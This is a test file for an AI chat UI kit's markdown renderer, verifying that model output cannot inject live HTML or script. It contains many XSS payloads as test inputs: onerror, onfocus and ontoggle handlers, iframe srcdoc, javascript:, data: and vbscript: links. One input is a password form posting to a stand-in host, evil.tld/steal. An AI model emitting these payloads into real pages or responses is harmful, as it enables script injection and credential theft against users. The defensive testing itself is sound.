// tests/components/markdown-xss.test.tsx
//
// The markdown path is where a string the MODEL produced becomes live DOM in the
// host page's origin. Every vector below was confirmed executing in Chromium
// against the shipped pipeline before the fix (assistant text -> marked ->
// innerHTML).
//
// THE SINK IS NO LONGER A RAW `innerHTML` WRITE. Since e66c004d the renderer emits
// a token stream, so raw HTML becomes a TEXT node and the escaping is done by the
// DOM rather than by a string filter. The kit's one remaining raw-`innerHTML`
// write is `code-block.tsx`'s `innerHTML={highlighted()}`, pinned by the hostile
// census in `tests/elements/code-block.test.tsx`; the fenced-code group at the
// bottom of this file covers the markdown path INTO that component, which is the
// one every assistant message with a code sample in it takes.
//
// The threat model is NOT "a hostile server". The attacker only has to
// influence the model's OUTPUT: a user pasting an example, a prompt-injected
// model, or RAG over an untrusted document all reach this sink against a
// perfectly trusted provider.
//
// Two properties are asserted for every vector, and BOTH matter:
//   1. no live element / handler / dangerous scheme lands in the DOM, and
//   2. the source text is still VISIBLE to the reader.
// (2) is what makes escaping the right rendering rather than merely the safe
// one: when a model explains `<img onerror>`, showing the tag is the correct
// answer. A filter that deleted the text would pass (1) and be a worse UI.
import { render } from '@solidjs/testing-library';
import { afterEach, describe, expect, test } from 'vitest';
import { Markdown } from '../../src/components/markdown';

afterEach(() => {
  document.body.innerHTML = '';
});

function mount(content: string) {
  return render(() => <Markdown content={content} />).container;
}

/** Every anchor/img/iframe URL attribute the render produced. */
function urls(el: HTMLElement): string[] {
  return [
    ...[...el.querySelectorAll('a')].map((a) => a.getAttribute('href')),
    ...[...el.querySelectorAll('img')].map((i) => i.getAttribute('src')),
    ...[...el.querySelectorAll('iframe')].map((i) => i.getAttribute('src')),
  ].filter((v): v is string => v !== null);
}

describe('markdown sink: raw HTML never becomes live DOM', () => {
  // The zero-click case. `<img src=x onerror>` fires on the guaranteed-failing
  // load of `x`, so it needs no user interaction at all.
  test('<img src=x onerror> does not create an img element', () => {
    const el = mount('Hello <img src=x onerror="window.__PWNED__=1">');
    expect(el.querySelector('img')).toBeNull();
    expect(el.textContent).toContain('<img src=x onerror="window.__PWNED__=1">');
  });

  test('<video onerror> does not create a video element', () => {
    const el = mount('<video src=x onerror="window.__PWNED__=1"></video>');
    expect(el.querySelector('video')).toBeNull();
  });

  // Fires when the user expands the disclosure — one click, no other bait.
  test('<details ontoggle> does not create a details element', () => {
    const el = mount('<details ontoggle="window.__PWNED__=1"><summary>x</summary>y</details>');
    expect(el.querySelector('details')).toBeNull();
  });

  // Zero-click: `autofocus` supplies the focus that fires `onfocus`.
  test('<input autofocus onfocus> does not create an input element', () => {
    const el = mount('<input autofocus onfocus="window.__PWNED__=1">');
    expect(el.querySelector('input')).toBeNull();
  });

  // `srcdoc` is a fresh same-origin document, so its <script> DOES run.
  test('<iframe srcdoc> does not create an iframe', () => {
    const el = mount('<iframe srcdoc="<script>parent.__PWNED__=1</script>"></iframe>');
    expect(el.querySelector('iframe')).toBeNull();
  });

  test('<a onclick> does not create an anchor carrying a handler', () => {
    const el = mount('<a href="#" onclick="window.__PWNED__=1">x</a>');
    const a = el.querySelector('a');
    // Assert the ATTRIBUTE, not the `.onclick` property. jsdom does not compile
    // inline handler attributes into properties at all, so a `.onclick` check
    // passes here even against the vulnerable build -- it would prove nothing.
    // A real browser DOES compile the attribute, so the attribute's absence is
    // the property that actually transfers.
    expect(a?.getAttribute('onclick') ?? null).toBeNull();
    expect(el.textContent).toContain('onclick=');
  });

  // Not script execution, but a credential-harvest surface rendered inside a
  // trusted chat bubble.
  test('<form action> does not create a form', () => {
    const el = mount('<form action="https://evil.tld/steal" method="post"><input name="password" type="password"></form>');
    expect(el.querySelector('form')).toBeNull();
  });

  // Inert via innerHTML today, but only by accident of how innerHTML works --
  // it must not reach the DOM either way.
  test('<script> does not create a script element', () => {
    const el = mount('<script>window.__PWNED__=1</script>');
    expect(el.querySelector('script')).toBeNull();
  });

  test('<svg onload> does not create an svg element', () => {
    const el = mount('<svg onload="window.__PWNED__=1"><circle r="10"/></svg>');
    expect(el.querySelector('svg')).toBeNull();
  });

  // <style> is not script, but it can restyle the whole host page from inside a
  // message bubble (overlay a fake login, hide the real UI).
  test('<style> does not create a style element', () => {
    const el = mount('<style>body{display:none}</style>');
    expect(el.querySelector('style')).toBeNull();
  });

  // <base> rewrites every relative URL resolution in the document.
  test('<base> does not create a base element', () => {
    const el = mount('<base href="https://evil.tld/">');
    expect(el.querySelector('base')).toBeNull();
  });

  // GFM tables run their cells through the inline tokenizer, which is a second
  // path to the same sink -- the fix has to cover the renderer, not one call site.
  test('raw HTML inside a GFM table cell is escaped too', () => {
    const el = mount('| a |\n| - |\n| <img src=x onerror="window.__PWNED__=1"> |');
    expect(el.querySelector('table')).not.toBeNull(); // the table itself still renders
    expect(el.querySelector('img')).toBeNull();
  });

  test('raw HTML inside a blockquote is escaped too', () => {
    const el = mount('> quoted <img src=x onerror="window.__PWNED__=1">');
    expect(el.querySelector('blockquote')).not.toBeNull();
    expect(el.querySelector('img')).toBeNull();
  });

  test('raw HTML inside a list item is escaped too', () => {
    const el = mount('- item <img src=x onerror="window.__PWNED__=1">');
    expect(el.querySelector('li')).not.toBeNull();
    expect(el.querySelector('img')).toBeNull();
  });

  test('<object data=javascript:> does not create an object element', () => {
    const el = mount('<object data="javascript:window.__PWNED__=1"></object>');
    expect(el.querySelector('object')).toBeNull();
  });
});

describe('markdown sink: dangerous URL schemes never reach an href/src', () => {
  // These are NOT raw HTML -- marked BUILDS the anchor itself from markdown
  // link syntax, so escaping raw HTML does not cover them. They need their own
  // guard, which is why they are asserted separately.
  const dangerous: [name: string, md: string][] = [
    ['javascript: link', '[click me](javascript:window.__PWNED__=1)'],
    ['mixed-case JaVaScRiPt: link', '[click me](JaVaScRiPt:window.__PWNED__=1)'],
    ['whitespace-padded javascript: link', '[click me](  javascript:window.__PWNED__=1  )'],
    ['data:text/html link', '[click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
    ['vbscript: link', '[click me](vbscript:msgbox(1))'],
    // HONEST NOTE: this one passed even against the vulnerable build, and not
    // because of any guard -- `parseMarkdownIntoBlocks` splits the source into
    // per-token blocks and re-parses each ALONE, so the `[r]:` definition lands
    // in a different block than the reference and never resolves. It renders as
    // literal text. Kept because the assertion is still the one we want if that
    // block-splitting ever changes; do not read it as evidence of the filter.
    ['reference-style javascript: link', '[click me][r]\n\n[r]: javascript:window.__PWNED__=1'],
    ['javascript: image', '![x](javascript:window.__PWNED__=1)'],
  ];

  for (const [name, md] of dangerous) {
    test(`${name} does not survive into the DOM`, () => {
      const el = mount(md);
      for (const u of urls(el)) {
        expect(u.toLowerCase().replace(/\s/g, '')).not.toMatch(/^(javascript|data|vbscript):/);
      }
    });
  }

  // The vector that makes the "URLs are never decoded" rule visible. Every one of
  // the schemes above is written LITERALLY in the markdown; this one hides its
  // colon behind a character reference, so a renderer that decoded `href` before
  // handing it to the scheme filter would turn a blocked link into a live one.
  // `isSafeUrl` and the browser both see `&` where a scheme needs `:`, read the
  // string as a relative path, and resolve it against the base -- which is why
  // this renders as an ordinary, harmless anchor rather than script.
  test('an entity-encoded scheme is NOT decoded into a live javascript: URL', () => {
    const el = mount('[click me](javascript&#58;window.__PWNED__=1)');
    const a = el.querySelector('a');
    // Whatever element came out, no URL-bearing attribute decodes into a scheme.
    for (const u of urls(el)) {
      expect(u.toLowerCase()).not.toContain('javascript:');
    }
    // The resolved URL is the relative path the browser also reads, not `javascript:`.
    expect(a?.href ?? '').not.toContain('javascript:');
    // And the source stayed VISIBLE, encoded form and all.
    expect(el.textContent).toContain('click me');
  });

  test('a blocked link still shows its text, so nothing vanishes silently', () => {
    const el = mount('[click me](javascript:window.__PWNED__=1)');
    expect(el.textContent).toContain('click me');
  });
});

describe('markdown sink: a fenced code block, through both fence paths', () => {
  // A code block is the one surface where the hostile string is ALSO the legitimate
  // content — "show me an HTML snippet" is an ordinary thing to ask a coding
  // assistant — so deleting it is not an option and the reader seeing the tag is
  // the correct answer.
  //
  // The two fence paths are different sinks, which is why both are here. A
  // TOP-LEVEL fence is split out by `parseMarkdownIntoBlocks` and rendered by the
  // Solid `CodeBlock`, whose finished HTML is written via `innerHTML`; a NESTED
  // fence (inside a quote or a list item) never leaves the token renderer and
  // becomes a text node in a plain `<pre><code>`. `CodeBlockCode` has three
  // suppliers of that `innerHTML` — shiki (a known grammar), the kit's own
  // `escapeHtml` via `plain()` (an unknown one), and the JSX `<Show>` fallback — and
  // all three escape `<` to `&lt;`, so the FORM does not identify which one ran. What
  // identifies it is `pre.shiki` for shiki and the `<span>` tokens as a live-census
  // control; the escape form is asserted only to prove the tag arrived as text.
  //
  // (A handoff note claimed the shiki form was `&#x3C;` and that asserting `&lt;`
  // would fail. The raw `innerHTML` below says otherwise — it is `&lt;` — so that
  // note was wrong for this pipeline and is not encoded here.)
  const HOSTILE = '<img src=x onerror="window.__PWNED__=1">\n<script>window.__PWNED__=1</script>';

  /** Shiki's own output, distinguishable from the plain fallback by its class. */
  const shikiPre = (el: HTMLElement) => el.querySelector('pre.shiki');

  /** Every element the render created, so an injected tag cannot hide. */
  const tags = (el: HTMLElement) => new Set([...el.querySelectorAll('*')].map((n) => n.tagName.toLowerCase()));

  /** Any live event-handler attribute anywhere under `el`. */
  const handlerAttrs = (el: HTMLElement) =>
    [...el.querySelectorAll('*')].flatMap((n) => [...n.attributes].map((a) => a.name)).filter((n) => /^on/i.test(n));

  /**
   * Poll until `check` holds. The highlight is async because shiki's first call
   * builds the core and dynamically imports the engine, theme and grammar, so the
   * latency is real and variable — a fixed sleep would be flaky or slow, and both
   * would be a worse test than waiting for the fact itself.
   */
  async function until(check: () => boolean, what: string, ms = 4000): Promise<void> {
    const deadline = Date.now() + ms;
    while (Date.now() < deadline) {
      if (check()) return;
      await new Promise((r) => setTimeout(r, 10));
    }
    throw new Error(`timed out waiting for: ${what}`);
  }

  test('a top-level fence: every injected element stays text, source stays visible', async () => {
    const el = mount('```html\n' + HOSTILE + '\n```');

    // The first paint is the plain fallback and lands synchronously, so it is
    // asserted before any await rather than after one.
    expect(el.querySelector('img')).toBeNull();
    expect(el.textContent).toContain('<img src=x onerror="window.__PWNED__=1">');

    // Then the paint that goes through `innerHTML={highlighted()}`.
    await until(() => shikiPre(el) !== null, 'the highlight to land on the innerHTML path');

    expect(el.querySelector('img')).toBeNull();
    expect(el.querySelector('script')).toBeNull();
    expect(el.querySelector('a')).toBeNull();
    expect(handlerAttrs(el)).toEqual([]);
    expect(tags(el).has('span'), 'CONTROL: the census is live, shiki tokens are real elements').toBe(true);
    expect(el.textContent, 'the source stays readable, escaped not deleted').toContain(
      '<img src=x onerror="window.__PWNED__=1">',
    );
    expect(el.innerHTML, 'the tag arrived as text, in the form the DOM serializes').toContain('&lt;');
    expect(el.innerHTML, 'and no raw tag survived the write').not.toContain("<img");
  });

  test('an UNKNOWN language fence: plain() escapes it, and stays visible', async () => {
    const el = mount('```cobol\n' + HOSTILE + '\n```');
    expect(el.querySelector('img')).toBeNull();

    // No grammar means no shiki markup, so `shikiPre` never appears and there is no
    // fact to poll for; the census is what has to hold, and it holds in both paints.
    await new Promise((r) => setTimeout(r, 300));

    expect(shikiPre(el)).toBeNull();
    expect(el.querySelector('img')).toBeNull();
    expect(el.querySelector('script')).toBeNull();
    expect(handlerAttrs(el)).toEqual([]);
    expect(el.textContent).toContain('<script>window.__PWNED__=1</script>');
    expect(el.innerHTML, 'the same escape form, because all three suppliers agree on it').toContain('&lt;script&gt;');
    expect(el.innerHTML).not.toContain('<img');
  });

  test('a NESTED fence stays in the token renderer and is text, not markup', () => {
    // The other path: inside a blockquote this never reaches `CodeBlock` at all, so
    // it must hold with no highlighter involved and no await needed.
    const el = mount('> ```html\n> ' + HOSTILE + '\n> ```');
    expect(el.querySelector('blockquote'), 'the quote itself still renders').not.toBeNull();
    expect(el.querySelector('img')).toBeNull();
    expect(el.querySelector('script')).toBeNull();
    expect(handlerAttrs(el)).toEqual([]);
    expect(el.textContent).toContain('<img src=x onerror="window.__PWNED__=1">');
  });
});

describe('markdown sink: legitimate markdown still works', () => {
  test('emphasis and strong render as elements', () => {
    const el = mount('**bold** and *italic*');
    expect(el.querySelector('strong')?.textContent).toBe('bold');
    expect(el.querySelector('em')?.textContent).toBe('italic');
  });

  test('https links keep their href and text', () => {
    const el = mount('[docs](https://ui.kitn.ai/guide?a=1&b=2#frag)');
    const a = el.querySelector('a');
    expect(a?.getAttribute('href')).toBe('https://ui.kitn.ai/guide?a=1&b=2#frag');
    expect(a?.textContent).toBe('docs');
  });

  test('http links survive', () => {
    const el = mount('[x](http://example.com/)');
    expect(el.querySelector('a')?.getAttribute('href')).toBe('http://example.com/');
  });

  test('mailto links survive', () => {
    const el = mount('[mail](mailto:hi@example.com)');
    expect(el.querySelector('a')?.getAttribute('href')).toBe('mailto:hi@example.com');
  });

  // Relative and anchor links are ordinary markdown and must not be collateral
  // damage from the scheme filter.
  test('relative and anchor links survive', () => {
    expect(mount('[a](/docs/guide)').querySelector('a')?.getAttribute('href')).toBe('/docs/guide');
    expect(mount('[b](#section)').querySelector('a')?.getAttribute('href')).toBe('#section');
    expect(mount('[c](./rel/path)').querySelector('a')?.getAttribute('href')).toBe('./rel/path');
  });

  test('autolinks survive', () => {
    const el = mount('<https://ok.example/>');
    expect(el.querySelector('a')?.getAttribute('href')).toBe('https://ok.example/');
  });

  test('https images keep their src and alt', () => {
    const el = mount('![a diagram](https://example.com/og.png)');
    const img = el.querySelector('img');
    expect(img?.getAttribute('src')).toBe('https://example.com/og.png');
    expect(img?.getAttribute('alt')).toBe('a diagram');
  });

  test('link titles survive and are attribute-escaped', () => {
    const el = mount('[x](https://example.com "a \\"quoted\\" title")');
    const a = el.querySelector('a');
    expect(a?.getAttribute('title')).toBe('a "quoted" title');
    expect(a?.getAttribute('href')).toBe('https://example.com');
  });

  test('GFM tables render as real tables', () => {
    const el = mount('| a | b |\n| - | - |\n| 1 | 2 |');
    expect(el.querySelectorAll('th')).toHaveLength(2);
    expect(el.querySelectorAll('td')).toHaveLength(2);
  });

  test('lists, headings and blockquotes render', () => {
    expect(mount('- a\n- b').querySelectorAll('li')).toHaveLength(2);
    expect(mount('## heading').querySelector('h2')?.textContent).toBe('heading');
    expect(mount('> quote').querySelector('blockquote')).not.toBeNull();
  });

  test('inline code renders escaped, not as markup', () => {
    const el = mount('use `<img src=x>` here');
    const code = el.querySelector('code');
    expect(code?.textContent).toBe('<img src=x>');
    expect(el.querySelector('img')).toBeNull();
  });

  test('strikethrough (gfm) and line breaks (breaks:true) still work', () => {
    expect(mount('~~gone~~').querySelector('del')?.textContent).toBe('gone');
    expect(mount('a\nb').querySelector('br')).not.toBeNull();
  });

  test('ampersands and angle brackets in prose are not double-escaped', () => {
    const el = mount('Tom & Jerry, 3 < 5');
    expect(el.textContent).toContain('Tom & Jerry');
    expect(el.textContent).toContain('3 < 5');
  });

  // GFM task lists. Pinned nowhere else: the `[x]` strings elsewhere in this suite
  // are markdown LINKS, not task items. The checked state is a DOM PROPERTY (which
  // is what the renderer binds, and what an HTML string could not have carried), so
  // that is what is asserted -- not `outerHTML`.
  test('GFM task lists render disabled checkboxes in the right state', () => {
    const el = mount('- [x] done\n- [ ] todo');
    const boxes = [...el.querySelectorAll<HTMLInputElement>('input[type="checkbox"]')];
    expect(boxes).toHaveLength(2);
    expect(boxes.every((b) => b.disabled)).toBe(true);
    expect(boxes[0].checked).toBe(true);
    expect(boxes[1].checked).toBe(false);
  });
});

describe('markdown sink: character references read as their characters', () => {
  // The old string sink got this from the browser's HTML parser for free; the token
  // stream does not, so the decoder is asserted here rather than assumed. Both
  // halves matter: what decodes, and what stays byte-for-byte literal.
  test('named references in prose decode', () => {
    expect(mount('AT&amp;T').textContent).toBe('AT&T');
    expect(mount('&copy; 2026').textContent).toBe('© 2026');
  });

  test('numeric and hexadecimal references decode', () => {
    expect(mount('&#65;').textContent).toBe('A');
    expect(mount('&#x41;').textContent).toBe('A');
    expect(mount('&#X41;').textContent).toBe('A');
  });

  test('everything that is not a complete reference stays literal', () => {
    expect(mount('AT&T').textContent).toBe('AT&T');
    expect(mount('&unknown;').textContent).toBe('&unknown;');
    expect(mount('&amp').textContent).toBe('&amp');
    expect(mount('a & b').textContent).toBe('a & b');
  });

  test('out-of-range and malformed numerics stay literal instead of throwing', () => {
    expect(mount('&#999999999;').textContent).toBe('&#999999999;');
    expect(mount('&#xZZ;').textContent).toBe('&#xZZ;');
  });

  // The spec says a character reference inside code is literal, so a sample
  // showing `&amp;` has to keep showing `&amp;`.
  test('an entity inside a code span is not decoded', () => {
    const el = mount('use `&amp;` here');
    expect(el.querySelector('code')?.textContent).toBe('&amp;');
  });

  test('an entity inside a fenced code block is not decoded', () => {
    const el = mount('```\n&amp;\n```');
    expect(el.querySelector('pre code')?.textContent).toContain('&amp;');
  });

  // Display-only attributes: the reader sees these, nothing navigates on them.
  test('link titles decode', () => {
    const a = mount('[x](https://example.com "a &amp; b")').querySelector('a');
    expect(a?.getAttribute('title')).toBe('a & b');
    expect(a?.getAttribute('href')).toBe('https://example.com');
  });

  test('image alt and title decode, while src stays verbatim', () => {
    const img = mount('![a &amp; b](https://example.com/x.png?a=1&amp;b=2 "t &amp; t")').querySelector('img');
    expect(img?.getAttribute('alt')).toBe('a & b');
    expect(img?.getAttribute('title')).toBe('t & t');
    expect(img?.getAttribute('src')).toBe('https://example.com/x.png?a=1&amp;b=2');
  });

  // Every branch that renders model text into a text node, not just `paragraph`.
  test('references decode in headings, list items and table cells too', () => {
    expect(mount('# AT&amp;T').querySelector('h1')?.textContent).toBe('AT&T');
    expect(mount('- AT&amp;T').querySelector('li')?.textContent).toBe('AT&T');
    expect(
      mount('| a |\n| - |\n| AT&amp;T |').querySelector('td')?.textContent,
    ).toBe('AT&T');
    expect(mount('> AT&amp;T').querySelector('blockquote')?.textContent).toBe('AT&T');
    expect(mount('**AT&amp;T**').querySelector('strong')?.textContent).toBe('AT&T');
    expect(mount('*AT&amp;T*').querySelector('em')?.textContent).toBe('AT&T');
    expect(mount('~~AT&amp;T~~').querySelector('del')?.textContent).toBe('AT&T');
    expect(mount('[AT&amp;T](https://example.com)').querySelector('a')?.textContent).toBe('AT&T');
  });
});

describe('markdown sink: the kit does not mutate the shared `marked` singleton', () => {
  // The kit used to call `marked.setOptions` on the global singleton. If the
  // sanitizing renderer were installed the same way, a CONSUMER's own
  // `marked.use({ renderer })` in the same app would silently replace it and
  // reopen this hole. Configuration therefore has to live on a private
  // instance, and this test is what keeps it there.
  test('the global marked singleton renders raw HTML through untouched', async () => {
    const { marked } = await import('marked');
    // A pristine singleton passes raw HTML through. If the kit had configured
    // it globally, this would come back escaped -- which would mean the kit's
    // safety is only as durable as the consumer not reconfiguring marked.
    expect(marked.parse('<img src=x>', { async: false })).toContain('<img src=x>');
  });
});
